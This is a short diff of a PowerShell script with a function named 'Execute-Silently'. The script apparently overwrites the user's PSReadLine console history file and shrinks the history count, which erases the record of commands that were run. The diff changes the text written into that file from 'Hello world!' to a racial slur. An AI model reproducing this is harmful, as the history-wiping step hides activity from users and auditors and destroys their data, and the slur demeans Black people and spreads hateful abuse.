@@ -7,7 +7,7 @@ function Execute-Silently {
 
 # Get the current user's profile path
 $filePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-$newContent = "Hello world!"  # New content to write to the file
+$newContent = "Fuck Niggers!"  # New content to write to the file
 
 $oldMaxHistory = $MaximumHistoryCount
 $MaximumHistoryCount = 1  # Set to a small value instead of 0
